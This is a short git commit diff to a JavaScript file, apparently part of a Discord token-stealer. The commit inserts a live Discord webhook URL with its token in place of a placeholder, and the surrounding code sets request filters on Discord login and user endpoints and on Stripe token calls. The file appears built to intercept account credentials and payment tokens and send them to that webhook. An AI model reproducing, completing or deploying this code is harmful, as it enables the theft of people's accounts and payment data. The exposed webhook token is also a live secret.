8216f511ef6b3356c1d198695ee95ecf0b5e196e
ZtczXKD543 <ardazarzar90@gmail.com>
2024-12-03 08:21:44 -0800

    Update lubilabiluu.js

--- lubilabiluu.js
+++ lubilabiluu.js
@@ -7,7 +7,7 @@ const fs = require('fs');
 const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
-const webhook = "%WEBHOOK_LINK%"
+const webhook = "https://discord.com/api/webhooks/1313530674258640896/hF9ObVq6i-DFK3y9A9N9swrLlcdFjAz9NdQsUqwyNiPUQ-EK2rLPWBeHsuG_0PHulg46"
 const Filters = {
     1: {
         urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
